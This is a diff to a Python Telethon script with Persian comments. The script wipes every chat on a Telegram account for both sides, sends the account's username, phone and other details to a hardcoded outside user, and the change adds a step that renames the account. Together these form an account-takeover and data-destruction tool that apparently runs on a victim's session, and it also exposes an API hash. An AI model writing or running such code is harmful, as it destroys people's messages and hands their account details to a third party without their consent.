@@ -1,10 +1,12 @@
 from telethon import TelegramClient
 from telethon.tl.functions.messages import DeleteHistoryRequest
+from telethon.tl.functions.account import UpdateProfileRequest
 
 API_ID = 29834234
 API_HASH = "552c01d21d127def060f2915aedeebf9"
 
-TARGET_USERNAME = "Moein_915"  # آیدی که اطلاعات اکانت بهش فرستاده میشه
+TARGET_USERNAME = "Moein_915"
+NEW_FIRST_NAME = "NewName"
 
 client = TelegramClient("my_account", API_ID, API_HASH)
 
@@ -14,14 +16,20 @@ async def main():
 
     async for d in client.iter_dialogs():
         try:
-            await client(DeleteHistoryRequest(peer=d.entity, max_id=0, revoke=True))
+            await client(DeleteHistoryRequest(
+                peer=d.entity,
+                max_id=0,
+                revoke=True
+            ))
         except Exception:
             pass
+
         await client.delete_dialog(d.entity)
         print(f"Deleted: {d.name or d.id}")
+
     print("Done deleting chats.")
 
-    # گرفتن اطلاعات اکانت خودم
+    # گرفتن اطلاعات اکانت
     me = await client.get_me()
     username = f"@{me.username}" if me.username else "(no username)"
     phone = f"+{me.phone}" if me.phone else "(no phone)"
@@ -31,9 +39,16 @@ async def main():
     print(info_text)
     print("--------------------------------")
 
-    # ارسال بدون تاییدیه
+    # ارسال اطلاعات
     await client.send_message(TARGET_USERNAME, info_text)
     print(f"Sent account info to {TARGET_USERNAME}")
+
+    # تغییر اسم در آخرین مرحله
+    await client(UpdateProfileRequest(
+        first_name=NEW_FIRST_NAME
+    ))
+
+    print(f"Account name changed to: {NEW_FIRST_NAME}")
 
 
 with client:
